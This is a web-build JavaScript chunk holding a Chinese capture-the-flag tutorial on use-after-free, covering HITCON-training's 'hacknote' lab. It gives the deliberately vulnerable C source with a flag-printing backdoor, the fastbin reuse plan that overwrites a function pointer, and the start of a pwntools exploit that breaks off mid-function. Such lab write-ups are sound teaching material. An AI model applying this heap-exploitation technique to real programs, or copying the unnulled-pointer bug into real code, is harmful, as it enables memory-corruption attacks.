import{_ as n}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as s,c as a,e as t}from"./app.a32a5bec.js";const p={},o=t(`<h1 id="_08-use-after-free" tabindex="-1"><a class="header-anchor" href="#_08-use-after-free" aria-hidden="true">#</a> 08.use_after_free</h1><h2 id="\u539F\u7406" tabindex="-1"><a class="header-anchor" href="#\u539F\u7406" aria-hidden="true">#</a> \u539F\u7406</h2><p>\u7B80\u5355\u7684\u8BF4\uFF0CUse After Free \u5C31\u662F\u5176\u5B57\u9762\u6240\u8868\u8FBE\u7684\u610F\u601D\uFF0C\u5F53\u4E00\u4E2A\u5185\u5B58\u5757\u88AB\u91CA\u653E\u4E4B\u540E\u518D\u6B21\u88AB\u4F7F\u7528\u3002\u4F46\u662F\u5176\u5B9E\u8FD9\u91CC\u6709\u4EE5\u4E0B\u51E0\u79CD\u60C5\u51B5\uFF1A</p><ul><li>\u5185\u5B58\u5757\u88AB\u91CA\u653E\u540E\uFF0C\u5176\u5BF9\u5E94\u7684\u6307\u9488\u88AB\u8BBE\u7F6E\u4E3A NULL \uFF0C \u7136\u540E\u518D\u6B21\u4F7F\u7528\uFF0C\u81EA\u7136\u7A0B\u5E8F\u4F1A\u5D29\u6E83\u3002</li><li>\u5185\u5B58\u5757\u88AB\u91CA\u653E\u540E\uFF0C\u5176\u5BF9\u5E94\u7684\u6307\u9488\u6CA1\u6709\u88AB\u8BBE\u7F6E\u4E3A NULL \uFF0C\u7136\u540E\u5728\u5B83\u4E0B\u4E00\u6B21\u88AB\u4F7F\u7528\u4E4B\u524D\uFF0C\u6CA1\u6709\u4EE3\u7801\u5BF9\u8FD9\u5757\u5185\u5B58\u5757\u8FDB\u884C\u4FEE\u6539\uFF0C\u90A3\u4E48<strong>\u7A0B\u5E8F\u5F88\u6709\u53EF\u80FD\u53EF\u4EE5\u6B63\u5E38\u8FD0\u8F6C</strong>\u3002</li><li>\u5185\u5B58\u5757\u88AB\u91CA\u653E\u540E\uFF0C\u5176\u5BF9\u5E94\u7684\u6307\u9488\u6CA1\u6709\u88AB\u8BBE\u7F6E\u4E3A NULL\uFF0C\u4F46\u662F\u5728\u5B83\u4E0B\u4E00\u6B21\u4F7F\u7528\u4E4B\u524D\uFF0C\u6709\u4EE3\u7801\u5BF9\u8FD9\u5757\u5185\u5B58\u8FDB\u884C\u4E86\u4FEE\u6539\uFF0C\u90A3\u4E48\u5F53\u7A0B\u5E8F\u518D\u6B21\u4F7F\u7528\u8FD9\u5757\u5185\u5B58\u65F6\uFF0C<strong>\u5C31\u5F88\u6709\u53EF\u80FD\u4F1A\u51FA\u73B0\u5947\u602A\u7684\u95EE\u9898</strong>\u3002</li></ul><p>\u800C\u6211\u4EEC\u4E00\u822C\u6240\u6307\u7684 <strong>Use After Free</strong> \u6F0F\u6D1E\u4E3B\u8981\u662F\u540E\u4E24\u79CD\u3002\u6B64\u5916\uFF0C\u6211\u4EEC\u4E00\u822C\u79F0\u88AB\u91CA\u653E\u540E\u6CA1\u6709\u88AB\u8BBE\u7F6E\u4E3A NULL \u7684\u5185\u5B58\u6307\u9488\u4E3A dangling pointer\u3002</p><p><a name="a0f671d4"></a></p><h2 id="hitcon-training-lab-10-hacknote" tabindex="-1"><a class="header-anchor" href="#hitcon-training-lab-10-hacknote" aria-hidden="true">#</a> HITCON-training lab 10 hacknote</h2><p>\u7A0B\u5E8F\u6E90\u7801\uFF1A</p><div class="language-c ext-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>

<span class="token keyword">struct</span> <span class="token class-name">note</span> <span class="token punctuation">{</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>printnote<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>content<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">note</span> <span class="token operator">*</span>notelist<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">print_note_content</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">note</span> <span class="token operator">*</span>this<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">puts</span><span class="token punctuation">(</span>this<span class="token operator">-&gt;</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> size<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Full&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">note</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">note</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Alloca Error&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>printnote <span class="token operator">=</span> print_note_content<span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Note size :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
      notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>content <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>content<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Alloca Error&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Content :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>content<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Success !&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      count<span class="token operator">++</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> idx<span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Index :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  idx <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> idx <span class="token operator">&gt;=</span> count<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Out of bound!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token operator">-&gt;</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Success&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> idx<span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Index :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  idx <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> idx <span class="token operator">&gt;=</span> count<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Out of bound!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    notelist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">printnote</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">&quot;cat flag&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;----------------------&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;       HackNote       &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;----------------------&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot; 1. Add note          &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot; 2. Delete note       &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot; 3. Print note        &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot; 4. Exit              &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;----------------------&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Your choice :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
      <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
      <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
      <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token operator">:</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Invalid choice&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a name="36bfad43"></a></p><h4 id="add-note-\u529F\u80FD" tabindex="-1"><a class="header-anchor" href="#add-note-\u529F\u80FD" aria-hidden="true">#</a> add note \u529F\u80FD\uFF1A</h4><ol><li>\u7533\u8BF7\u4E00\u4E2A\u516B\u5B57\u8282\u7684\u5185\u5B58\u7528\u6765\u5B58\u653Eput\u51FD\u6570\u6307\u9488\u548Ccontent\u6307\u9488</li><li>\u6839\u636E\u8F93\u5165\u7684size\u503C\u6765\u7533\u8BF7\u5185\u5B58\uFF0C\u7528\u6765\u5B58\u653Ereal content</li></ol><p>\u7533\u8BF7\u540E\u7684\u5185\u5B58\u5206\u5E03\u5982\u56FE\uFF1A<br><img src="https://img-blog.csdnimg.cn/20210221163112702.png#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=e68k7&amp;originHeight=151&amp;originWidth=516&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p><p>\u7A0B\u5E8FDelete note\u529F\u80FD\uFF0C\u53EA\u5BF9\u5185\u5B58\u8FDB\u884C\u4E86free\uFF0C\u800C\u6CA1\u6709\u5C06\u5BF9\u5E94\u7684\u6307\u9488\u7F6E\u4E3ANULL\uFF0C\u5BFC\u81F4use_after_free;<br><img src="https://img-blog.csdnimg.cn/20210221163137289.png#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=q90Xg&amp;originHeight=126&amp;originWidth=411&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p><p>\u5B58\u5728\u540E\u95E8\u51FD\u6570\uFF1A<br><img src="https://img-blog.csdnimg.cn/20210221163156697.png#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=ElZ2m&amp;originHeight=37&amp;originWidth=429&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p><p>\u7A0B\u5E8FPrint note\u529F\u80FD\u662F\u901A\u8FC7\u6307\u9488\u51FD\u6570\u8C03\u7528\u51FD\u6570\u7684\uFF0C<strong>\u4E00\u4E2A\u5F88\u76F4\u63A5\u7684\u60F3\u6CD5\u662F\u4FEE\u6539 note \u7684 put \u5B57\u6BB5\u4E3A magic \u51FD\u6570\u7684\u5730\u5740\uFF0C\u4ECE\u800C\u5B9E\u73B0\u5728\u6267\u884C print note \u7684\u65F6\u5019\u6267\u884C magic \u51FD\u6570\u3002</strong></p><p><a name="1a7f5c22"></a></p><h3 id="\u5229\u7528\u601D\u8DEF" tabindex="-1"><a class="header-anchor" href="#\u5229\u7528\u601D\u8DEF" aria-hidden="true">#</a> \u5229\u7528\u601D\u8DEF\uFF1A</h3><ol><li>\u7533\u8BF7 note0\uFF0Creal content size \u4E3A 32\uFF0C\u8F93\u5165\u7684content\u4E3A\u201Caaaa\u201D\uFF08\u5927\u5C0F\u4E0E note \u5927\u5C0F\u6240\u5728\u7684 bin \u4E0D\u4E00\u6837\u5373\u53EF\uFF09<br><img src="https://img-blog.csdnimg.cn/2021022116325585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=IPj2E&amp;originHeight=306&amp;originWidth=778&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></li><li>\u7533\u8BF7 note1\uFF0Creal content size \u4E3A 32\uFF0C\u8F93\u5165\u7684content\u4E3A\u201Cbbbb\u201D\uFF08\u5927\u5C0F\u4E0E note \u5927\u5C0F\u6240\u5728\u7684 bin \u4E0D\u4E00\u6837\u5373\u53EF\uFF09<br><img src="https://img-blog.csdnimg.cn/20210221163326624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=znZWj&amp;originHeight=283&amp;originWidth=678&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></li><li>\u91CA\u653E note0\uFF0C\u5185\u5B58\u4F1A\u8FDB\u5165fastbin\u4E2D\uFF0C\u4E14content chunk\u548Cnote chunk\u4F1A\u8FDB\u5165\u4E0D\u540C\u7684\u4F4D\u7F6E</li><li>\u91CA\u653E note1</li><li>\u6B64\u65F6\uFF0C\u5927\u5C0F\u4E3A 0x10 \u7684 fast bin chunk \u4E2D\u94FE\u8868\u4E3A note1-&gt;note0<br><img src="https://img-blog.csdnimg.cn/20210221163405277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=Uokbf&amp;originHeight=720&amp;originWidth=871&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></li><li>\u7533\u8BF7 note2\uFF0C\u5E76\u4E14\u8BBE\u7F6E real content \u7684\u5927\u5C0F\u4E3A 8\uFF0C\u90A3\u4E48\u6839\u636E\u5806\u7684\u5206\u914D\u89C4\u5219\uFF1A<br>note2 \u5176\u5B9E\u4F1A\u5206\u914D note1 \u5BF9\u5E94\u7684\u5185\u5B58\u5757\u3002<br>real content \u5BF9\u5E94\u7684 chunk \u5176\u5B9E\u662F note0\u3002<br><img src="https://img-blog.csdnimg.cn/20210221163502412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=OJXRc&amp;originHeight=651&amp;originWidth=867&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></li><li>\u5982\u679C\u6211\u4EEC\u8FD9\u65F6\u5019\u5411 note2 real content \u7684 chunk \u90E8\u5206\u5199\u5165 magic \u7684\u5730\u5740\uFF0C\u90A3\u4E48\u7531\u4E8E\u6211\u4EEC\u6CA1\u6709 note0 \u4E3A NULL\u3002\u5F53\u6211\u4EEC\u518D\u6B21\u5C1D\u8BD5\u8F93\u51FA note0 \u7684\u65F6\u5019\uFF0C\u7A0B\u5E8F\u5C31\u4F1A\u8C03\u7528 magic \u51FD\u6570\u3002</li></ol><p><a name="964d959d"></a></p><h3 id="\u5229\u7528\u811A\u672C" tabindex="-1"><a class="header-anchor" href="#\u5229\u7528\u811A\u672C" aria-hidden="true">#</a> \u5229\u7528\u811A\u672C\uFF1A</h3><div class="language-python ext-py line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&#39;./hacknote&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">addnote</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">delnote</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;2&quot;</span><span class="token punctuation">)</span>
